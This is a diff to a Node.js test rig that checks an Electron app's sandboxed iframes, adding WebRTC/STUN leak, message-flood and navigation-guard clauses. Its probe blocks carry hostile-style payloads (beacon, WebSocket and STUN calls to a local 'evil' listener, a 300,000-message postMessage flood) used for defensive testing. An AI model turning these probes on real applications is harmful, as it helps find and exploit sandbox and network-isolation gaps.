@@ -6,6 +6,7 @@
 //   real          the build as is — every clause GREEN (P* = what a human sees, I* = what a bloc can reach)
 //   policy        a COPY whose frame document lost its policy <meta>         → I1 must go RED (frame reaches the local listener)
 //   nav           a COPY whose main-process navigation guard never fires      → I2 must go RED (a frame navigation reaches the listener)
+//   webrtc        a COPY whose app window allows non-proxied UDP              → I6 must go RED (a STUN request from the frame reaches a UDP listener)
 //   sandbox-api   a COPY whose frame lost its `sandbox` attribute (same-origin) → I3 must go RED (the frame reads the app's API object)
 //   sandbox-loop  the same copy, a looping bloc                               → I4 must go RED (the window freezes)
 // A mutant arm passes only if its named clause is RED, every control GREEN, and its OTHER evaluated I-clauses GREEN (it removes ONE guard).
@@ -13,6 +14,7 @@
 import { execFileSync, spawn } from 'node:child_process';
 import crypto from 'node:crypto';
 import fs from 'node:fs';
+import dgram from 'node:dgram';
 import http from 'node:http';
 import net from 'node:net';
 import path from 'node:path';
@@ -22,7 +24,7 @@ const argv = process.argv.slice(2);
 const flag = (n, d) => { const i = argv.indexOf(n); return i >= 0 ? argv[i + 1] : d; };
 const APP_DIR = argv[0] && !argv[0].startsWith('--') ? fs.realpathSync(argv[0]) : null;
 const LIVE_HOME = flag('--live-home', null);
-const ARMS = (flag('--arms', 'real,policy,nav,sandbox-api,sandbox-loop')).split(',');
+const ARMS = (flag('--arms', 'real,policy,nav,webrtc,sandbox-api,sandbox-loop')).split(',');
 const refuse = (m) => { console.log(`REFUSED: ${m}`); process.exit(3); };
 if (!APP_DIR) refuse('no <app-dir>');
 if (!LIVE_HOME) refuse('--live-home missing (needed to protect the live ~/.claude* and to prove nothing there moved)');
@@ -107,12 +109,14 @@ class Cdp {
 }
 
 // ── the "network": a local listener that records every request, upgrade and raw connection ─────────
-function startEvil() {
+async function startEvil() {
   const hits = []; let conns = 0;
   const srv = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' }); res.end('evil'); });
   srv.on('connection', () => { conns++; });
   srv.on('upgrade', (req, sock) => { hits.push(`UPGRADE ${req.url}`); sock.destroy(); });
-  return new Promise((res) => srv.listen(0, '127.0.0.1', () => res({ srv, port: srv.address().port, hits, conns: () => conns, reset: () => { hits.length = 0; conns = 0; } })));
+  let udp = 0; const us = dgram.createSocket('udp4'); us.on('message', () => { udp++; }); // WebRTC/STUN is not governed by the frame's policy: a UDP listener sees it
+  await new Promise((r) => us.bind(0, '127.0.0.1', r));
+  return new Promise((res) => srv.listen(0, '127.0.0.1', () => res({ srv, port: srv.address().port, udpPort: us.address().port, udp: () => udp, hits, conns: () => conns, reset: () => { hits.length = 0; conns = 0; udp = 0; }, close: () => { srv.close(); us.close(); } })));
 }
 
 // ── seeding: a real git repo + registered worktree, the PINNED scratch account, a stub `claude` ────
@@ -150,7 +154,7 @@ const fence = (info, body) => '```' + info + '\n' + body + '\n```';
 // ── the blocs ─────────────────────────────────────────────────────────────────────────────────────
 const THEME_BLOC = `<div id="card" style="width:50%;height:200px;background:var(--bloc-accent);color:var(--bloc-surface)">card</div>
 <script>parent.postMessage({__probe:'theme',r:{accent:getComputedStyle(document.getElementById('card')).backgroundColor,fg:getComputedStyle(document.body).color,fs:getComputedStyle(document.body).fontSize,bg:getComputedStyle(document.body).backgroundColor,fgVar:getComputedStyle(document.documentElement).getPropertyValue('--bloc-fg').trim()}},'*')</script>`;
-const isoBloc = (evil, port) => `<div id="m" style="height:60px;color:var(--bloc-accent)">isolation probe</div>
+const isoBloc = (evil, port, udpPort) => `<div id="m" style="height:60px;color:var(--bloc-accent)">isolation probe</div>
 <link rel="preconnect" href="${evil}"><link rel="prefetch" href="${evil}/prefetch"><link rel="stylesheet" href="${evil}/css">
 <style>#m{background:url(${evil}/cssimg)}</style><img src="${evil}/img">
 <script>(function(){var r={};function t(f){try{return f()}catch(e){return 'ERR '+e.name}}
@@ -163,6 +167,7 @@ new Image().src='${evil}/img2';
 t(function(){var x=new XMLHttpRequest();x.open('GET','${evil}/xhr');x.send()});
 t(function(){new WebSocket('ws://127.0.0.1:${port}/ws')});
 t(function(){navigator.sendBeacon('${evil}/beacon','x')});
+t(function(){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${udpPort}'}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)})});
 setTimeout(function(){parent.postMessage({__probe:'iso',r:r},'*')},900)})()</script>`;
 const navBloc = (evil) => `<meta http-equiv="refresh" content="1;url=${evil}/nav-meta"><a id="lnk" href="${evil}/nav-link" target="_top">x</a><div style="height:30px">navigation probe</div>
 <script>setTimeout(function(){try{location.href='${evil}/nav-js'}catch(e){}},300);
@@ -180,6 +185,7 @@ function saveShot(name, buf) { fs.mkdirSync(OUT, { recursive: true }); const f =
 // ── the mutants: ONE string in a disposable COPY of the built app ─────────────────────────────────
 const MUTANTS = {
   policy: { clause: 'I1', dir: 'dist/assets', from: '<meta http-equiv="Content-Security-Policy" content="', to: '<meta http-equiv="X-Bloc-Mutant-No-Policy" content="' },
+  webrtc: { clause: 'I6', dir: 'dist-electron', from: 'setWebRTCIPHandlingPolicy("disable_non_proxied_udp")', to: 'setWebRTCIPHandlingPolicy("default")' },
   nav: { clause: 'I2', dir: 'dist-electron', from: '"will-frame-navigate"', to: '"will-frame-navigatX"' },
   'sandbox-api': { clause: 'I3', dir: 'dist/assets', from: 'sandbox:"allow-scripts"', to: '"data-x":"allow-scripts"' },
   'sandbox-loop': { clause: 'I4', dir: 'dist/assets', from: 'sandbox:"allow-scripts"', to: '"data-x":"allow-scripts"' },
@@ -294,6 +300,11 @@ async function runArm(arm, evil) {
       const after = await cdp.eval(`({ pending: document.querySelectorAll('.av-bloc-pending').length, frames: document.querySelectorAll('iframe.av-bloc-frame').length })`);
       clause(arm, 'P5/open-fence-is-a-placeholder-then-renders-once-on-close', pend.text.includes('En cours') && pend.frames === before && after.pending === 0 && after.frames === before + 1, `while open: placeholder "${pend.text}", frames ${before} -> ${pend.frames}; after close: placeholders ${after.pending}, frames ${after.frames}`);
 
+      // a FINISHED reply that ends inside an open fence (interrupted turn, reload): the source as code, never a placeholder forever
+      await inject(evText('OPENDONE-MARK\n```html-render title="Coupé"\n<p>OPENDONE-CODE</p>'));
+      await waitFor(() => cdp.eval(`(() => { const m = [...document.querySelectorAll('.av-message')].find((e) => e.textContent.includes('OPENDONE-MARK')); return !!m && !!m.querySelector('.av-code-lang'); })()`), 30000, 'the finished open-fence reply');
+      const od = await cdp.eval(`(() => { const m = [...document.querySelectorAll('.av-message')].find((e) => e.textContent.includes('OPENDONE-MARK')); return { langs: [...m.querySelectorAll('.av-code-lang')].map((x) => x.textContent), code: m.textContent.includes('OPENDONE-CODE'), pending: m.querySelectorAll('.av-bloc-pending').length, frames: m.querySelectorAll('iframe').length }; })()`);
+      clause(arm, 'P5b/finished-reply-ending-in-an-open-fence-shows-code', od.langs[0] === 'html-render' && od.code && od.pending === 0 && od.frames === 0, `done reply, fence never closed → code ${JSON.stringify(od.langs)} with the source=${od.code}, placeholders ${od.pending}, iframes ${od.frames}`);
       // everything that must stay CODE
       const f0 = (await frames()).length;
       await inject(evText('HTMLFENCE-MARK\n' + fence('html', '<p>HTMLCODE-MARK</p>')));
@@ -345,15 +356,17 @@ async function runArm(arm, evil) {
     const I = {};
     if (arm !== 'sandbox-loop') {
       evil.reset();
-      await inject(evText('ISO-MARK\n' + fence('html-render title="Isolation"', isoBloc(E, evil.port))));
+      await inject(evText('ISO-MARK\n' + fence('html-render title="Isolation"', isoBloc(E, evil.port, evil.udpPort))));
       const r = await waitFor(() => probe('iso'), 30000, 'the isolation probe report');
-      await sleep(2500);
+      await sleep(4000);
       const net = evil.hits.filter((u) => !/^\/nav/.test(u) && !/^\/popup/.test(u));
       I.I1 = { ok: net.length === 0, detail: `listener ${E} saw ${net.length} request(s) from the frame's fetch/xhr/img/css/prefetch/beacon/websocket: ${JSON.stringify(net)}; frame says fetch=${r.fetch}` };
+      I.I6 = { ok: evil.udp() === 0, detail: `UDP datagrams at the listener after an RTCPeerConnection with a stun: server on it: ${evil.udp()}` };
       clause(arm, 'X1/preconnect-opens-no-connection', evil.conns() === 0, `raw TCP connections to the listener after <link rel=preconnect>: ${evil.conns()} (requests ${evil.hits.length})`);
       I.I3 = { ok: /^ERR/.test(r.parentApi) && /^ERR/.test(r.parentDoc) && r.ownApi === 'undefined/undefined' && r.origin === 'null' && /^ERR/.test(r.cookie), detail: `from inside the frame: typeof parent.orchestra = ${r.parentApi}; parent.document = ${r.parentDoc}; own orchestra/require = ${r.ownApi}; origin = ${r.origin}; cookie = ${r.cookie}` };
       evil.reset();
       await inject(evText('NAV-MARK\n' + fence('html-render title="Navigation"', navBloc(E))));
+      await waitFor(async () => (await frames()).some((f) => f.title === 'Navigation'), 30000, 'the navigation bloc frame');
       await sleep(4500); // no probe report: a frame that navigates away takes its script with it
       const navHits = evil.hits.filter((u) => /^\/(nav|popup)/.test(u));
       const appLog = fs.readFileSync(logFile, 'utf8') + (fs.existsSync(path.join(world.ohome, 'logs', 'orchestra.log')) ? fs.readFileSync(path.join(world.ohome, 'logs', 'orchestra.log'), 'utf8') : '');
@@ -362,6 +375,7 @@ async function runArm(arm, evil) {
       I.I2 = { ok: navHits.length === 0 && opened.length === 0, detail: `listener saw ${navHits.length} navigation request(s) (location.href / meta refresh / link click / window.open / top.location): ${JSON.stringify(navHits)}; app asked the OS to open the listener's URL ${opened.length}x; guard refusals logged ${refused}` };
       const fr = (await frames()).find((f) => f.title === 'Navigation');
       I.I2.detail += `; frame still in the page: ${!!fr}`;
+      if (arm === 'real') clause(arm, 'ctl/navigation-guard-fired', refused >= 1 && !!fr, `the app logged ${refused} refusal(s) of a sub-frame navigation (a green I2 with 0 refusals would mean the bloc never navigated)`);
     }
     if (arm === 'real') {
       // plan-review card (modal): its fence stays code — BEFORE the loop, which must leave the window answering
@@ -373,10 +387,18 @@ async function runArm(arm, evil) {
       clause(arm, 'P11/plan-review-card-fence-stays-code', plan.text.includes('PLANCODE-MARK') && plan.langs[0] === 'html-render' && plan.frames === 0 && plan.all === nF, `plan card shows the fence as code ${JSON.stringify(plan.langs)}, iframes in the card ${plan.frames}, in the page ${plan.all} (was ${nF})`);
       saveShot('real-plan-review-renderer.png', await cdp.shot());
     }
+    if (arm === 'real') {
+      // a bloc flooding height reports must leave the window responsive (measured, no mutant arm: the guard is "one comparison per report")
+      await inject(evText('FLOOD-MARK\n' + fence('html-render title="Flood"', '<div style="height:40px">flood</div><script>setTimeout(function(){for(var i=0;i<300000;i++)parent.postMessage({__blocHtml:1,h:i%2000},"*");parent.postMessage({__probe:"flood",r:{sent:1}},"*")},300)</script>')));
+      await waitFor(() => probe('flood'), 60000, 'the flood bloc to finish sending');
+      const t1 = Date.now();
+      const fa = await Promise.race([cdp.eval('1 + 1', 4000).then((v) => ({ v }), (e) => ({ err: String(e).slice(0, 80) })), sleep(5000).then(() => ({ timeout: true }))]);
+      I.I5 = { ok: fa.v === 2 && Date.now() - t1 < 1500, detail: `300000 height reports from one frame; an evaluation in the app window right after: ${JSON.stringify(fa)} in ${Date.now() - t1} ms` };
+    }
     if (arm === 'real' || arm === 'sandbox-loop') {
       // the loop runs in its OWN bloc, last: a same-origin frame freezes the whole window (the control must see that)
       await inject(evText('LOOP-MARK\n' + fence('html-render title="Boucle"', LOOP_BLOC)));
-      await waitFor(() => probe('loop'), 30000, 'the loop bloc to start').catch(() => null);
+      await waitFor(() => probe('loop'), 30000, 'the loop bloc to start'); // a loop that never started would pass I4 vacuously
       await sleep(2000);
       const t0 = Date.now();
       const ans = await Promise.race([cdp.eval('1 + 1', 4000).then((v) => ({ v }), (e) => ({ err: String(e).slice(0, 80) })), sleep(5000).then(() => ({ timeout: true }))]);
@@ -384,8 +406,8 @@ async function runArm(arm, evil) {
     }
 
     // ── verdicts of the isolation clauses ──
-    const names = { I1: 'I1/frame-without-policy-reaches-a-local-listener', I2: 'I2/navigation-guard-removed-reaches-the-listener', I3: 'I3/same-origin-frame-reads-the-api-object', I4: 'I4/same-origin-looping-frame-freezes-the-window' };
-    const named = { I1: 'policy blocks every network path', I2: 'a frame navigation goes nowhere', I3: 'parent + app API unreachable from the frame', I4: 'a looping frame leaves the window responsive' };
+    const names = { I6: 'I6/webrtc-stun', I5: 'I5/message-flood', I1: 'I1/frame-without-policy-reaches-a-local-listener', I2: 'I2/navigation-guard-removed-reaches-the-listener', I3: 'I3/same-origin-frame-reads-the-api-object', I4: 'I4/same-origin-looping-frame-freezes-the-window' };
+    const named = { I6: 'WebRTC sends no UDP', I5: 'a flooding frame leaves the window responsive', I1: 'policy blocks every network path', I2: 'a frame navigation goes nowhere', I3: 'parent + app API unreachable from the frame', I4: 'a looping frame leaves the window responsive' };
     for (const k of Object.keys(I)) clause(arm, `${k}/${named[k]}`, I[k].ok, `${names[k].split('/')[1]} :: ${I[k].detail}`);
     fs.writeFileSync(path.join(OUT, `${arm}-hits.json`), JSON.stringify({ hits: evil.hits, conns: evil.conns(), I }, null, 2));
     if (arm !== 'sandbox-loop') {
@@ -430,7 +452,7 @@ const before = liveCanary();
 const evil = await startEvil();
 console.log(`[rig] app ${APP_DIR} arms ${ARMS.join(',')} listener 127.0.0.1:${evil.port} out=${OUT}`);
 for (const arm of ARMS) { if (arm !== 'real' && !MUTANTS[arm]) refuse(`unknown arm ${arm}`); await runArm(arm, evil); }
-evil.srv.close();
+evil.close();
 const after = liveCanary();
 const same = JSON.stringify(before) === JSON.stringify(after);
 clause('rig', 'ctl/live-claude-dirs-untouched', same, `${Object.keys(before).length} live ~/.claude* dirs, symlink-set + mcpServers hashes ${same ? 'identical before/after' : 'CHANGED: ' + JSON.stringify({ before, after })}`);
@@ -444,8 +466,8 @@ for (const arm of ARMS) {
   const mine = results.filter((c) => c.arm === arm);
   const ctlRed = mine.filter((c) => isCtl(c) && !c.ok).map((c) => c.clause);
   if (arm === 'real') {
-    const red = mine.filter((c) => !c.ok && !c.clause.startsWith('X')).map((c) => c.clause);
-    const x = mine.filter((c) => c.clause.startsWith('X') && !c.ok).map((c) => c.clause);
+    const red = mine.filter((c) => !c.ok).map((c) => c.clause); // X* (preconnect, webrtc) are measured leaks: they count
+    const x = [];
     lines.push(`real: ${red.length === 0 ? 'ALL GREEN' : 'RED ' + red.join(', ')} (${mine.length} clauses)${x.length ? `; MEASURED LEAK ${x.join(', ')}` : ''}`);
     if (red.length) rc = 1;
   } else {
